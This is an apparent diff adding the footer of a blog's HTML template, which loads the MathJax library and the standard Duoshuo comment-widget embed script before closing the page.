+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+  
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"blkstone"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+
+
+  
+  
+
+</body>
+</html>
